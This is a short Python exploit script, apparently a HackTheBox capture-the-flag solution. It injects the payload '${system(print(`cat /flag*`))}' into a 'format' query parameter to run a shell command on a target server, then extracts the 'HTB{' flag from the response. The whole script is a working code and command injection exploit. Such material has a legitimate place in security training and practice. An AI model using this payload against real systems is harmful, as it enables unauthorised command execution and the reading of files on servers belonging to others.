#!/usr/bin/python3
from requests import get
from sys import argv
from re import findall


r = get(argv[1] + "?format=${system(print(`cat /flag*`))}")

#print(r.text)
print(findall("HTB{.*", r.text)[0])